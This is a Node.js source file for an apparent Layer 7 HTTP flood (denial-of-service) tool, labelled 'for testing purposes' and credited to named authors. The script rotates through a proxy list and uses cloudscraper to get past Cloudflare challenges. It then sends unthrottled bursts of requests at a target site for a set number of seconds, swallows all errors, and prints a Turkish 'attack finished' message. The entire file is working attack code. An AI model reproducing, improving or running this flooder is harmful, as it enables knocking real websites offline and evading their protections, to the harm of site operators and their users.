// Layer 7 tools for testing purposes - Coded by: Vodkazerss1900 & Aidennaaa
// node vodkazerss.js example.com 30 100 proxy.txt

const RESET = "\x1b[0m";
const RED = "\x1b[31m";
const GREEN = "\x1b[32m";

require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    path = require('path');

if (process.argv.length !== 6) {
    console.log(`
${RED}Github: github.com/Vodkazerss1900
Discord: discord.gg/1900
YouTube: youtube.com/@vodkazerss${RESET}

${GREEN}node ${path.basename(__filename)} <http://vodkazerss.com.tr> <30> <100> <proxy.txt>`);
process.exit(0);
}


const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];

let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

function request_send() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return console.log(error.message);
            }
            resolve(response.request.headers);
        });
    });

    getHeaders.then(function (result) {
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, function (error, response) {
                if (error) {
                    console.log(error.message);
                }
            });
        }
    });
}

setInterval(() => {
    request_send();
});

setTimeout(() => {
    console.log('Saldırı Bitti.');
    process.exit(0)
}, time * 1000);

process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});